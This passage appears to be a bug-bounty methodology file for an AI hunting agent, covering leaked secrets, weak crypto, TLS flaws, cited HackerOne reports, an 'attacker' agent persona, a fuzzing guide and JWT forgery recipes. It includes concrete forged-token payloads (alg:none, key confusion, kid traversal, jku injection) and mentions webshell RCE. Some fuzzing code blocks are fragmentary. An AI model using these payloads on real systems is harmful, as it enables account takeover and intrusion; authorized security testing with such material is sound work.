  never checks the result, accepting untrusted certs (`#3374554`, `#4123304`).
- **No validation at all** — older mobile apps simply skip cert checking; a MitM
  can sniff/alter traffic (`#5786`, `#173251`).

### Encoding / Parser-Confusion Bypasses for Secrets
- **Disclosed-report mining** — keys left unblurred in public disclosures can be
  reused directly; `#1047125` simply replayed the YouTube/Aviary keys from
  Stripo's own disclosure of `#983331`.
- **Decode before dismissing** — a value that "looks random" may be base64 of a
  working credential; the Sauce Labs key in `#1302395` was "encoded, not
  encrypted." GitHub PR diffs and old commits often show the plaintext.
- **Sourcemap retrieval** — when the minified bundle hides names, request the
  `.js.map` referenced by `sourceMappingURL`; the original variable names
  (`REACT_APP_ZENDESK_SECRET`) reveal exactly what the secret controls
  (`#638635`).
- **Key-length oracles** — in weak-crypto components, base64 validation can leak
  the true key length: `#491668` found the Telerik machine key was 88 bytes
  because longer guesses made the base64 "restart" at the 89th position.

### Token / Credential-Flow Bypasses
- **Cross-origin redirect reuse** — get a Bearer token, netrc, digest nonce, or
  mTLS client cert carried to an attacker-controlled origin via `-L`
  (`#3514263`, `#3680038`, `#3749428`, `#3735180`, `#4125043`).
- **Unverifiable deeplinks** — an empty `assetlinks.json` lets a malicious app
  register the same scheme and intercept login tokens (`#855618`).
- **Analytics forwarding** — rely on the app copying the full reset URL into
  page events, leaking the still-unused token before submission (`#4000185`).
- **CSP-trusted dangling domain** — claim a subdomain on a provider the CSP
  allowlists (Fastly `freetls`) to serve content on the trusted origin
  (`#716677`).

---

## Gate 0 Validation

Before writing ANY report in this class, confirm all three.

1. **What can the attacker DO right now?**
   - Is the leaked secret **live**? Show a provider API response proving it works
     (Rockset/Facebook token call). A dead key is Low/Info at best.
   - Is the token **unused and privileged**? Show the reset link / OAuth code was
     valid and crossed into another user's session.
   - Is the crypto flaw **exploitable**, not just theoretical? Show the forged
     redirect, decrypted value, or RCE — not merely "MD5 is used."
   - Is the TLS issue **demonstrated**? A working bypass PoC (plaintext request,
     an accepted bad certificate, a bypassed OCSP check), not just "cipher supported" or "CAA missing."
   - "The string looks like a key" or "the header is absent" is insufficient.

2. **What does the victim LOSE?**
   - Cloud keys → arbitrary actions, data access, and billing charges
     (`#3017105`).
   - App secret → forge tokens for any user / modify app settings (`#638635`,
     `#1641475`).
   - Reset token / session → full account takeover (`#4000185`, `#855618`,
     `#745324`).
   - Crypto weakness → file read, RCE, or cross-user data (`#491668`,
     `#678496`, `#2294930`).
   - If the answer is only "a secret is present in code," quantify privilege and
     liveness or downgrade the severity.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the secret still valid and the endpoint/asset still live?
   - Can a second person fetch the same bundle/commit and get the same result?
   - Does the TLS/crypto PoC work reliably (not version- or timing-dependent)?

### Honesty / scope gate (special to this class)
- **Missing CAA** is not a vulnerability — it does not enable certificate
  issuance; it is recon intel only (`#129992`, `#410245`).
- **Weak cipher *support*** (RC4/3DES/TLS 1.0) without a decrypt PoC is
  Info/Low hardening and frequently OOS (`#76303`, `#194761`).
- **Expired cert on a non-prod/stage host** may be accepted as Low (`#220615`);
  grade by real exposure.
- **Absence of HSTS** needs a concrete downgrade victim to be more than Info.
- Quote the program's in-scope line before filing email-auth/TLS-hardening items.

---

## Real Impact Examples

### Scenario A — Live Cloud Credentials from a Public GitHub Repo (AWS VDP #3017105)
A researcher found AWS Access Key + Secret Key in a public GitHub repository.
Because the key was live, any attacker could perform actions as the authenticated
principal, access AWS resources, and incur charges. The impact is bounded only by
the IAM policy attached to the credential — a textbook Critical secrets finding.
The same pattern appears with unrevoked keys in old commits (`#1094151`) and keys
left unblurred in disclosed reports (`#1047125`).

### Scenario B — Client-Side JWT Secret → Forge Any SSO Identity (Trint #638635)
Trint implemented Zendesk SSO using JWT, and the signing secret
`REACT_APP_ZENDESK_SECRET` was compiled into `app.e984c9df.js` and exposed in the
`.js.map` sourcemap. Since the secret is public, an attacker can run
`jwt.sign(payload, REACT_APP_ZENDESK_SECRET)` for any identity and append
`?jwt=<forged>` to `zendesk.com/access/jwt`, logging in as any user — including
support admins. The entire trust boundary collapses because the secret never
belonged on the client.

### Scenario C — Weak Crypto → RCE (Telerik #491668 / Pulse Secure #678496)
On a DoD host, an unpatched Telerik DialogHandler had a known weak encryption
flaw that let the researcher brute-force the 88-character machine key
(detected by watching base64 validation repeat at the 89th position). The key
unlocked the DNN file manager, where an ASPX shell was uploaded for RCE. In the
Pulse Secure chain, a pre-auth path traversal (`CVE-2019-11510`) read
`/data/runtime/mtmp/lmdb/data.mdb`, where credentials were stored in cleartext,
and chained to full RCE. Both show crypto/file-read weaknesses escalating to
code execution.

### Scenario D — Live Reset Token Leaked to Analytics (HackerOne Code #4000185)
Opening a real password-reset link automatically sent the complete unused
64-character reset token to Segment in `context.page.search`, `context.page.url`,
`properties.search`, and `properties.url` — before the reset form was submitted.
Anyone with access to the analytics stream could take over the account. This is a
reminder that secrets in URLs plus third-party beacons are a real ATO primitive.

---

## Disclosed Report Citations (30 — all IDs present in study pack)

1. **HackerOne — Account takeover via leaked session cookie** ([H1 #745324](https://hackerone.com/reports/745324)) — insufficiently protected credentials / session-cookie leak, 2019, $20,000 (CVSS 8.3).
2. **Stripo Inc — Public and secret API key leaked in JavaScript source** ([H1 #983331](https://hackerone.com/reports/983331)) — secrets in JS bundle / js-source-review, 2020, Medium.
3. **Trint Ltd — Insecure Zendesk SSO implementation by generating JWT client-side** ([H1 #638635](https://hackerone.com/reports/638635)) — JWT secret in sourcemap / client-side signing, 2019, High (CVSS 8.1).
4. **U.S. Dept Of Defense — Leaking PII of tour visitors via misconfigured record permissions** ([H1 #2294930](https://hackerone.com/reports/2294930)) — cleartext storage / aura.token enumeration, 2023, Critical.
5. **Curve — Sensitive Info Leak: retrieve all users' mobile numbers** ([H1 #902733](https://hackerone.com/reports/902733)) — cleartext transmission / API data exposure, 2020, Medium.
6. **PortSwigger Web Security — Deceptive Manipulation of HTTP to HTTPS with VPN** ([H1 #2230842](https://hackerone.com/reports/2230842)) — cleartext transmission / downgrade illusion, 2023, Medium.
7. **Zenly — Insecure Storage and Overly Permissive API Keys in Android App** ([H1 #753868](https://hackerone.com/reports/753868)) — hardcoded API keys in APK, 2019, $750.
8. **AWS VDP — Sensitive API Key Leakage** ([H1 #3017105](https://hackerone.com/reports/3017105)) — AWS Access/Secret key in public GitHub, 2025, Medium.
9. **U.S. Dept Of Defense — Arbitrary File Reading leads to RCE in Pulse Secure SSL VPN** ([H1 #695005](https://hackerone.com/reports/695005)) — CVE-2019-11510 path traversal, 2019, Critical.
10. **Omise — Secret API Key is logged in cleartext** ([H1 #1662194](https://hackerone.com/reports/1662194)) — secret logged via `logger.debug`, 2022, Medium.
11. **GlassWire — Facebook App API credentials leaked in the APK** ([H1 #1641475](https://hackerone.com/reports/1641475)) — app secret in binary → working token, 2022, Medium.
12. **curl — Apple SecTrust legacy path accepts untrusted certificates** ([H1 #3374554](https://hackerone.com/reports/3374554)) — improper certificate validation / OSStatus type confusion, 2025, High.
13. **Shopify — Account takeover intercepting magic link for Arrive app** ([H1 #855618](https://hackerone.com/reports/855618)) — magic-link token in unverifiable deeplink, 2020, Low.
14. **Shopify — Shop App: intercept authorization code during OAuth (Outlook)** ([H1 #1700734](https://hackerone.com/reports/1700734)) — OAuth code interception via deeplink, 2022, $900 (CVSS 3.7).
15. **curl — CVE-2019-5443: Windows Privilege Escalation via Malicious OpenSSL Engine** ([H1 #608577](https://hackerone.com/reports/608577)) — code injection via `openssl.cnf` engine path, 2019, High (CVSS 7.8).
16. **GitLab — Domain Takeover of gl-canary.freetls.fastly.net** ([H1 #716677](https://hackerone.com/reports/716677)) — CSP-trusted dangling domain takeover, 2019, $200.
17. **Ruby on Rails — Sauce Labs API key unencrypted in an old commit** ([H1 #1302395](https://hackerone.com/reports/1302395)) — encoded-not-encrypted key in git history / TruffleHog, 2021, Medium.
18. **Uber — CBC "cut and paste" attack causing Open Redirect (even XSS)** ([H1 #126203](https://hackerone.com/reports/126203)) — CBC block manipulation on encrypted param, 2016, $500.
19. **X / xAI — AppLovin API Key hardcoded in a GitHub repo** ([H1 #674774](https://hackerone.com/reports/674774)) — hardcoded SDK key in source, 2019, $280 (High).
20. **HackerOne — Missing Certificate Authority Authorization rule** ([H1 #129992](https://hackerone.com/reports/129992)) — missing CAA (recon intel, not a vulnerability), 2016.
21. **Stripo Inc — Non-revoked API Key Disclosure in a Disclosed Report** ([H1 #1047125](https://hackerone.com/reports/1047125)) — unblurred, still-working API key, 2020, Medium (CVSS 4.4).
22. **Rockset — Leaking Rockset API key on GitHub** ([H1 #1094151](https://hackerone.com/reports/1094151)) — API key in old commit, validated via provider API, 2021, High.
23. **Slack — Uninstall/reinstall keeps you logged in** ([H1 #238260](https://hackerone.com/reports/238260)) — session data not cleared on uninstall, 2017, $500.
24. **curl — Improper Authentication State Management on Cross-Protocol Redirects** ([H1 #3514263](https://hackerone.com/reports/3514263)) — OAuth2 Bearer token leak on redirect, 2026, Low.
25. **FantasyTote — Insecure password change mechanism → account takeover** ([H1 #147203](https://hackerone.com/reports/147203)) — no old-password verification, 2016.
26. **HackerOne — Missing Certificate Authority Authorization rule** ([H1 #410245](https://hackerone.com/reports/410245)) — missing CAA on hacker101 domains, 2018.
27. **curl — Digest Auth State Leak on Cross-Origin Redirect via Netrc** ([H1 #3680038](https://hackerone.com/reports/3680038)) — cross-origin credential leak, 2026, Medium.
28. **Basecamp — SSL expired subdomain leads to API swap with flagged cookies** ([H1 #1024880](https://hackerone.com/reports/1024880)) — expired cert / cookie scope flags, 2020, Medium.
29. **Bumble — SSO through odnoklassniki uses http rather than https** ([H1 #703759](https://hackerone.com/reports/703759)) — cleartext transmission of SSO credentials, 2019, $150.
30. **U.S. Dept Of Defense — RCE via CVE-2017-9248 (Telerik weak machine key)** ([H1 #491668](https://hackerone.com/reports/491668)) — weak-crypto machine-key brute force → webshell/RCE, 2019, Critical.

---

## Related Skills & Chains

- **`hunt-jwt-crypto`** — owns JWT *forgery mechanics* (alg:none, key confusion,
  kid/jku injection). This skill finds the leaked signing secret in client code or
  sourcemaps (Trint `#638635`); hand the secret to `hunt-jwt-crypto` to forge an
  admin token. Chain: secrets-in-JS → JWT secret → forge any identity.

- **`hunt-tls-network`** — owns TLS/DNS *hardening triage* (missing HSTS, weak
  cipher support, AXFR, CAA, subdomain takeover). This skill supplies the crypto
  depth: HSTS trailing-dot/IDN bypasses, OCSP staple/session-reuse bypasses, and
  cert-validation failures. Chain: HSTS bypass + MitM position → session capture.

- **`hunt-ssrf`** — metadata SSRF is a sibling class. A leaked cloud key
  (`#3017105`) or an SSRF-reached IMDS can both yield cloud credentials; if a
  secret-unaware SSRF reaches metadata, pivot to `cloud-iam-deep`.

- **`hunt-ato`** — reset-token and magic-link leaks (`#4000185`, `#855618`,
  `#745324`) are account-takeover primitives. This skill finds the token leak;
  `hunt-ato` drives the account-takeover impact.

- **`hunt-api-misconfig`** — API endpoints returning keys/PII without
  authorization (`#902733`, `#2294930`) overlap with API misconfig. Coordinate to
  avoid duplicate reports.

- **`cloud-iam-deep`** — a live AWS/cloud credential from a repo is the entry to
  IAM privilege escalation (CreateUser / AssumeRole), converting a secrets finding
  into full cloud compromise.

- **`hunt-subdomain`** — CSP-trusted dangling domains (`#716677`) are a
  subdomain-takeover finding; that skill has the full claim-and-canary workflow.

- **`security-arsenal`** — load the secret-scanning wordlists and the
  crypto-weakness checklist (key sizes, cipher modes, hash-vs-HMAC) before a
  secrets/crypto engagement.

- **`triage-validation`** — apply the Gate 0 liveness/exploitability discipline:
  a key must be proven working, a token unused and privileged, and a crypto/TLS
  flaw demonstrated — never reported on pattern-match alone.


---

## Merged Source Knowledge

This section consolidates **113 unique knowledge blocks** from 6 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (133 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/bountyforge/references/hacking-agents/crypto-math-agent.md`

# Crypto / Math & Precision Agent

You are not a reviewer. You are an attacker. Your domain is every place a protocol trusts math to be correct — and gets it wrong. Overflow wraps. Precision evaporates. Signatures lie. Nonces replay. You find the exact input that breaks the invariant and prove it with numbers.

### Integer Arithmetic

- **Overflow/Underflow (pre-0.8 or `unchecked` blocks):** Find every `uint` subtraction and multiplication. Can the result wrap? What's the downstream effect?
- **Truncation:** `uint256 → uint128 → uint64` downcasts. Is the value checked before cast? Truncation in `uint32(block.timestamp)` causes year-2038 class issues.
- **Multiplication before division:** `(a / b) * c` loses precision vs `(a * c) / b`. Find all fee, percentage, and exchange rate calculations.
- **Division by zero:** Any `denominator` variable that could be zero — is it checked?
- **`mulDiv` with rounding direction:** Protocol-favoring rounding (round down for user-receivable, round up for protocol-receivable). Find cases where direction is wrong, especially when compounding.

### Precision Loss & Rounding

- **Dust accumulation:** Small amounts rounded to zero repeatedly. Attacker makes many small operations to drain via accumulated rounding errors.
- **Exchange rate manipulation:** `price = totalAssets / totalShares` — when `totalShares → 0` or `totalAssets → 0`, precision collapses. First depositor / inflation attack vector.
- **Fixed-point arithmetic:** Decimals mismatch between tokens (6 vs 18). Computation done in 6-decimal space then scaled — is the scale applied correctly?
- **Nonce precision loss:** Large nonce values cast to smaller types (e.g., `uint32`) that overflow. Nonce wraps → replay window opens.

### Cryptographic Primitives

- **`ecrecover` zero address:** If signature is invalid, `ecrecover` returns `address(0)`. Is the return value checked `!= address(0)`?
- **Signature malleability:** `s` value in the upper half of the curve range. EIP-2 compliance check.
- **Replay attacks:** Missing `chainId`, `nonce`, `deadline`, or `contractAddress` in the signed message hash.
- **Weak randomness:** `keccak256(block.timestamp, block.prevrandao, msg.sender)` — miner/validator manipulable. Any RNG that an on-chain actor can influence.
- **Hash length extension:** SHA-2 constructions used without HMAC — attacker can extend the message.
- **Merkle proof:** Missing leaf preimage validation (hash the leaf before checking, not the raw value). Missing check that the proof length is bounded.

### EIP-712 & Structured Hashing

- `DOMAIN_SEPARATOR` not including `chainId` → cross-chain replay.
- `DOMAIN_SEPARATOR` not including `verifyingContract` → cross-contract replay.
- `DOMAIN_SEPARATOR` cached at deploy time but contract is deployed behind a proxy that moves chains — stale separator.
- Type hash not matching the actual struct fields — attacker crafts a different struct that hashes to the same typehash.
- `encodeData` for arrays/structs: elements not individually hashed before inclusion → collision.

### Key Management & Threshold Schemes

- Single point of failure: `numRequiredAttestations == 1` or `threshold == 1` in multisig-like systems.
- Key rotation gap: old key still valid during rotation window.
- HSM/TEE assumption: contract assumes key is in hardware but doesn't enforce it on-chain.
- Attester set not bounded: unlimited attesters can be added, potential denial-of-service via set size.

### Solana / Anchor Specific

- `u64` arithmetic without `checked_add`/`checked_mul` in non-0.8 equivalent contexts.
- `Clock::get()?.unix_timestamp` as `i64` — potential sign issues when used in `u64` context.
- `Pubkey::find_program_address` bump seed not validated — attacker uses a non-canonical bump.

### DEFLATE / Compression (SDK-level)

- Buffer truncation: decompression output buffer not sized for worst-case expansion (32KB input → 1MB output).
- Zip bomb: crafted input that expands to memory exhaustion.
- Partial decompression: function returns partial output without error on truncated input — downstream consumer treats partial data as complete.

## Output Fields

Add to FINDINGs:

```
operation: <the arithmetic/crypto operation that's flawed>
numeric_proof: <concrete values showing the overflow/precision loss>
  e.g., amount=2^128, shares=1 → price=0 due to truncation
affected_invariant: <what mathematical property is violated>
```

## Rules
- No vague findings — prove it with numbers
- Assume hostile input at every call site
- Every `unchecked` block is a suspect until cleared
- Every downcast is a footgun until range-checked
- No `chainId` in a signed hash = replay vector
- `ecrecover` returning `address(0)` = open door


### From `hunt-skills/fuzzing/offensive-fuzzing/SKILL.md`

## Fuzzer Types

| Type | Coverage | Speed | Tools |
|------|----------|-------|-------|
| BlackBox | Poor | Fast | Peach, Boofuzz |
| GreyBox | Good | Fast | AFL++, Honggfuzz, libFuzzer, WinAFL |
| Snapshot | Good | Fastest | Nyx, wtf, Snapchange |
| WhiteBox | Best | Slow | KLEE, QSYM, SymSan |
| Ensemble | Best | Fast | AFL++ + Honggfuzz + libFuzzer |

**GreyBox sub-variants:** Directed (AFLGo, UAFuzz), Grammar (AFLSmart, Tlspuffin), Concolic (QSYM, Driller), Kernel (syzkaller, kAFL, wtf).

## Core Workflow

```
Research target → Choose analyses → Build harness → Seed corpus → Instrument → Fuzz → Triage crashes → Report
```

### 1. Research Target

- Map all input surfaces (files, network, IPC, syscalls, IOCTL)
- Identify high-value areas: previously patched code, complex parsers, newly added code, input ingestion points
- For kernel modules: look beyond `copy_from_user` — DMA-BUF ops, page fault handlers, VM operation structs, allocation callbacks

# AFL++ (preferred for GreyBox)
CC=afl-clang-fast CXX=afl-clang-fast++ cmake -DCMAKE_BUILD_TYPE=Release .. && make -j

# CmpLog build for hard compares
AFL_LLVM_CMPLOG=1 CC=afl-clang-fast CXX=afl-clang-fast++ make clean all
```

**Windows (MSVC):** `Project Properties → C/C++ → Address Sanitizer: Yes (/fsanitize=address)`

### 3. Write Harness

**libFuzzer (C++):**
```cpp
#include <cstdint>
#include <cstddef>
extern "C" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {
    parse_or_process(data, size);
    return 0;
}
```

**Honggfuzz HF_ITER (persistent mode — preferred for large targets):**
```cpp
#include "honggfuzz.h"
int main(int argc, char** argv) {
    initialize_target(); // runs once
    for (;;) {
        size_t len; uint8_t *buf;
        HF_ITER(&buf, &len);
        FILE* s = fmemopen(buf, len, "r");
        target_function(s);
        fclose(s);
        reset_target_state();
    }
}
```

**AFL++ persistent mode (`__AFL_LOOP`):**
```cpp
while (__AFL_LOOP(10000)) {
    // re-read input and process
}
```

**macOS IPC (Mach message fuzzing):**
```c
void *lib_handle = dlopen("libexample.dylib", RTLD_LAZY);
pFunction = dlsym(lib_handle, "DesiredFunction");
```

### 4. Build Seed Corpus

- Pull from target's test suite, bug reports, and real-world samples
- Web-crawl (Common Crawl) for file formats; filter by MIME type
- Minimize: `afl-cmin -i raw_corpus -o seeds -- ./target @@`
- Trim inputs: `afl-tmin -i crash -o crash.min -- ./target @@`

### 5. Launch Fuzzing

**AFL++ parallel (primary + secondary with cmplog):**
```bash
afl-fuzz -M f1 -i seeds -o findings -x dict.txt -- ./target @@
afl-fuzz -S s1 -i seeds -o findings -c 0 -- ./target @@
```

**libFuzzer:**
```bash
./target_libfuzzer corpus/ -max_total_time=3600 -workers=4
```

**Binary-only (QEMU):**
```bash
afl-fuzz -Q -i seeds -o findings -- target.exe @@
```

**Snapshot (AFL++ Nyx):**
```bash
NYX_MODE=1 AFL_MAP_SIZE=1048576 afl-fuzz -i seeds -o findings -- ./target_nyx @@
```

**Ensemble (AFL++ + Honggfuzz sharing corpus):**
```bash

# Terminal 2
../honggfuzz/honggfuzz -i sync_dir/fuzzer1/queue -W sync_dir/hfuzz \
  --linux_perf_ipt_block -t 10 -- ./target ___FILE___
```

### 6. Monitor and Unstick

If progress stalls:
- Enable CmpLog: `-c 0` on AFL++ secondaries
- Add dictionary: `-x dict.txt` or `AFL_TOKEN_FILE`
- Switch to directed fuzzing (AFLGo) targeting specific BBs/functions
- Use concolic assistance (QSYM, Driller) on hard branches
- Snapshot the target to increase exec/s
- `AFL_MAP_SIZE=1048576`, `-L 0` for MOpt scheduler

# 3. Hash + bucket
./cov-tool --bbids ./target crash.min > cov.hash
./bucket.py --key "$(cat cov.hash)" --log asan.log --out triage/
```

**Sanitizer env quick reference:**
```
ASAN_OPTIONS=abort_on_error=1:symbolize=1:detect_stack_use_after_return=1
UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
TSAN_OPTIONS=halt_on_error=1:history_size=7
MSAN_OPTIONS=poison_in_dtor=1:track_origins=2
```

## Oracle Selection

| Bug Class | Oracle |
|-----------|--------|
| Memory safety | ASan, HWASan (AArch64, lower overhead) |
| Uninitialized reads | MSan |
| Concurrency | TSan |
| Undefined behavior | UBSan |
| Type safety | TypeSan |
| Heap hardening | Scudo Hardened Allocator |
| Logic bugs | Differential / idempotency oracles |
| Kernel memory | KASAN, KMSAN, KCSAN |
| Kernel UB | KUBSan (`CONFIG_UBSAN_TRAP=y`) |
| CFI | KCFI (`-fsanitize=kcfi`, Clang 18) |
| Binary-only | QASAN (QEMU+ASan), DynamoRIO |

**Property oracle patterns:**
- Idempotency: `f(x) == f(f(x))`
- Differential: compare two impls, bucket on output mismatch
- Invariants: monotonic lengths, checksum equality, schema validation post-parse

### Kernel (Linux) — syzkaller

```json
{
  "target": "linux/arm64",
  "http": ":56700",
  "workdir": "/path/to/workdir",
  "kernel_obj": "/path/to/kernel",
  "image": "/path/to/rootfs.ext3",
  "sshkey": "/path/to/id_rsa",
  "procs": 8,
  "enable_syscalls": ["openat$module_name", "ioctl$IOCTL_CMD", "mmap"],
  "type": "qemu",
  "vm": { "count": 4, "cpu": 2, "mem": 2048 }
}
```

- Limit `enable_syscalls` to deepen coverage on specific subsystems
- Use `syz-extract` to pull constants for custom modules
- Enable `CONFIG_KASAN=y`, `CONFIG_KCFI=y`, `CONFIG_DEBUG_INFO_BTF=y`
- Use `kcov` filters and `syz_cover_filter` to direct coverage
- Network fuzzing: inject via `TUN/TAP` + pseudo-syscalls (`syz_emit_ethernet`)
- Crash decode: `./scripts/decode_stacktrace.sh vmlinux ... < dmesg.log`

**syzkaller repro:**
```bash
syz-execprog -repeat=0 -procs=1 -cover=0 -debug target.repro
```

### EDR / Windows Scanning Engines

**WTF snapshot harness skeleton (mpengine.dll / mini-filter):**
```cpp
g_Backend->SetBreakpoint("nt!KeBugCheck2", [](Backend_t *Backend) {
    const uint64_t BCode = Backend->GetArg(0);
    Backend->Stop(Crash_t(fmt::format("crash-{:#x}", BCode)));
});
```

**FilterConnectionPort fuzzing:**
```cpp
HANDLE hPort;
FilterConnectCommunicationPort(L"\\PortName", 0, NULL, 0, NULL, &hPort);
FilterSendMessage(hPort, fuzzData, sizeof(fuzzData), NULL, 0, &bytesReturned);
```

**IOCTL fuzzing pattern:**
```cpp
HANDLE hDev = CreateFile(L"\\\\.\\DeviceName", GENERIC_READ|GENERIC_WRITE, ...);
DeviceIoControl(hDev, ioctlCode, inputBuf, inputLen, outBuf, outLen, &ret, NULL);
```

- Take snapshots after initialization, right before parse/dispatch loop
- Use IDA Lighthouse for coverage visualization
- Monitor: `DRIVER_VERIFIER_DETECTED_VIOLATION (0xc4)`, `IRQL_NOT_LESS_OR_EQUAL (0xa)`
- WinDbg: `.symfix; !analyze -v; k; !heap -p -a @rax`

**Cross-platform mpengine.dll on Linux (loadlibrary + HF_ITER + Intel PT):**
```cpp
// Bypass Lua VM to avoid stability issues
insert_function_redirect((void*)luaV_execute_address, my_lua_exec, HOOK_REPLACE_FUNCTION);
for (;;) {
    HF_ITER(&buf, &len);
    ScanDescriptor.UserPtr = fmemopen(buf, len, "r");
    __rsignal(&KernelHandle, RSIG_SCAN_STREAMBUFFER, &ScanParams, sizeof ScanParams);
}
```

# Full Rust fuzzing pipeline
cargo test                                         # 1. property tests
cargo +nightly miri test                           # 2. UB via interpreter
cargo +nightly careful test                        # 3. runtime bounds checks
cargo fuzz run fuzz_target_1 -- -max_total_time=3600  # 4. libFuzzer crashes
RUSTFLAGS="--cfg loom" cargo test --release        # 5. concurrency (if needed)
cargo fuzz coverage fuzz_target_1                  # 6. coverage report
```

Focus unsafe blocks on: `Vec::from_raw_parts`, unchecked indexing, `transmute` size mismatches, pointer arithmetic, FFI integer truncation.

### Embedded / Binary-Only

- **LibAFL**: Modular Rust framework; Unicorn engine, snapshot module, LBRFeedback (zero-instrumentation on Intel), SAND decoupled sanitization
- **Retrowrite / QASAN**: Binary rewriting for coverage + ASan without source
- **Nautilus**: Grammar-based fuzzing for structured formats

### Language Ecosystems

- **Go 1.18+**: `go test -fuzz=Fuzz -run=^$ ./...`
- **Python**: [Atheris](https://github.com/google/atheris) (CPython native extension fuzzing)
- **Rust**: `cargo-fuzz` or `honggfuzz-rs`
- **JS engines**: Fuzzilli with extended instrumentation (`__builtin_return_address(0)` for PC tracking)
- **Wasm runtimes**: `wasmtime-fuzz`, `wafl` for differential fuzzing across V8/Wasmer/Wasmtime
- **Smart contracts**: Echidna, Foundry-fuzz (Solidity); Move-Fuzz (Aptos/Sui)

## CI/CD Integration

```yaml
- name: Build with afl-clang-fast
  run: CC=afl-clang-fast make -j
- name: Fuzz (smoke, 15 min)
  run: timeout 15m afl-fuzz -i seeds -o findings -- ./target @@ || true
- name: Upload crashes
  if: always()
  uses: actions/upload-artifact@v4
  with:
    path: findings/**/crashes/*
```

Use **ClusterFuzzLite** for persistent continuous fuzzing; cache corpora between runs.

## Crash Analysis Quick Reference

**Linux:**
```bash
ulimit -c unlimited && sysctl -w kernel.core_pattern=core.%e.%p
gdb -q ./target core.* -ex 'bt' -ex 'info reg' -ex q
addr2line -e ./target 0xDEADBEEF
```

**Windows:**
```powershell

# Enable local dumps
New-Item 'HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps' -Force

# PageHeap
gflags /p /enable target.exe /full
```

**Kernel KASAN/KMSAN:**
```bash
dmesg -T | egrep -i 'kasan|kmsan' -A 60
./scripts/decode_stacktrace.sh vmlinux /lib/modules/$(uname -r)/build < dmesg.log
```

**Reproducibility:** pin CPU governor, disable ASLR only where safe, fix RNG seeds, save input sequences in persistent mode, record binary hashes and sanitizer options with every crash.

## Tool Index

| Tool | Use Case |
|------|----------|
| [AFL++](https://github.com/AFLplusplus/AFLplusplus) | General GreyBox, CmpLog, MOpt, Nyx |
| [Honggfuzz](https://github.com/google/honggfuzz) | Intel PT, crash detection, HF_ITER |
| [libFuzzer](https://llvm.org/docs/LibFuzzer.html) | In-process, source available |
| [syzkaller](https://github.com/google/syzkaller) | Linux/Windows kernel syscall fuzzing |
| [wtf](https://github.com/0vercl0k/wtf) | Snapshot fuzzing, Windows targets |
| [Nyx](https://github.com/nyx-fuzz/Nyx) | AFL++ snapshot mode (Intel PT) |
| [Snapchange](https://github.com/awslabs/snapchange) | AWS snapshot fuzzing |
| [LibAFL](https://github.com/AFLplusplus/LibAFL) | Custom Rust fuzzing framework |
| [AFLGo](https://github.com/aflgo/aflgo) | Directed fuzzing to target BB/function |
| [kAFL](https://github.com/IntelLabs/kAFL) | Kernel + OS fuzzing |
| [Jackalope](https://github.com/googleprojectzero/Jackalope) | Binary coverage-guided (Windows/macOS) |
| [cargo-fuzz](https://github.com/rust-fuzz/cargo-fuzz) | Rust libFuzzer integration |
| [Atheris](https://github.com/google/atheris) | Python fuzzing |
| [Nautilus](https://github.com/nautilus-fuzz/nautilus) | Grammar-based fuzzing |
| [AFLTriage](https://github.com/quic/AFLTriage) | Automated crash triage |
| [afl-cov](https://github.com/mrash/afl-cov) | Coverage analysis for AFL++ |
| [ClusterFuzz](https://github.com/google/clusterfuzz) | Distributed fuzzing infrastructure |


### From `hunt-skills/hunt-jwt-crypto/SKILL.md`

## What actually pays

A JWT is `header.payload.signature`, each base64url. The signature is the only
thing stopping you from editing the payload (your identity/role) and replaying
it. It pays **High/Critical** when the verifier can be tricked into accepting a
token you forged — so you become another user or an admin without their secret.

Two classic, generic verifier flaws:

- **`alg:none`** — the verifier trusts the token's own `alg` header. Set
  `alg:"none"`, drop the signature, edit the payload (e.g. `role:"admin"`,
  another user's `id`/`email`). A broken verifier skips signature checking.
- **RS256 → HS256 key confusion** — the token is signed RS256 (asymmetric). The
  RSA **public** key is, by definition, public. If the verifier lets you choose
  HS256, it will use that public key as the HMAC *secret* — which you also know.
  Sign an edited payload with HS256 using the public key and it validates.

## Recon — is this app JWT-based?

```
Login/token responses containing  "token":"eyJ..."   or  Set-Cookie: token=eyJ...
Authorization: Bearer eyJ...    on authenticated requests
A JWKS / public-key endpoint:   /.well-known/jwks.json, /jwks, public-key in the JS bundle
```

Decode the header (base64url the first segment). `"alg":"RS256"` → try key
confusion. Any alg → always try `alg:none` first; it's free.

## Forging the token (never hand-encode base64 — use a JWT tool)

Use a purpose-built tool so encoding/signing is correct: **jwt_tool**
(`jwt_tool <token> -T` to tamper interactively, `-X a` for alg:none, `-X k -pk
public.pem` for key confusion), Burp's **JWT Editor** extension, or a few lines
of **PyJWT**. Each forge below is the concept plus the claim to edit.

**alg:none — become admin / another user**
```
header:    {"alg":"none","typ":"JWT"}
payload:   {"data":{"id":1,"email":"admin@target.example","role":"admin"}}
signature: (empty — keep the trailing dot:  header.payload. )
```
Some verifiers reject lowercase `none` but accept `None`/`NONE`/`nOnE` — try case variants.

**RS256 → HS256 key confusion — once you have the RSA public key**
```
1. Obtain the server's RSA public key as PEM. Sources: /jwks.json or
   /.well-known/jwks.json (convert the JWK to PEM), a public-key file in the JS
   bundle, or recover it from two captured tokens (e.g. jwt_tool / rsa_sign2n).
2. Re-sign an EDITED payload with HS256, using that PEM as the HMAC secret:
      jwt_tool <token> -X k -pk public.pem
   payload edit:  {"sub":"administrator"}   (or role:"admin" / another user's id)
```

**kid header injection — verifier loads the HMAC key from a FILE named by `kid`**
```
header:  {"alg":"HS256","kid":"../../../../../../../dev/null"}
secret:  ""     (contents of /dev/null = empty string → sign HS256 with an empty secret)
payload: {"sub":"administrator"}
```
Traverse out of the keys directory first. `kid` can also carry SQLi / command
injection / SSRF if the key lookup hits a DB / shell / URL — same idea: `kid` is
attacker-controlled and reaches a dangerous sink.

**jku / x5u header injection (RS256) — verifier fetches the public key from a URL in the token**
```
1. Host a JWKS containing a public key you control, on a server the verifier can reach.
2. Set the token's `jku` (or `x5u`) header to that URL and sign the edited payload
   with YOUR matching private key.
3. If the verifier allowlists jku hosts, chain an open-redirect or SSRF-reachable
   path on the target's OWN domain so the fetch resolves to your JWKS.
```

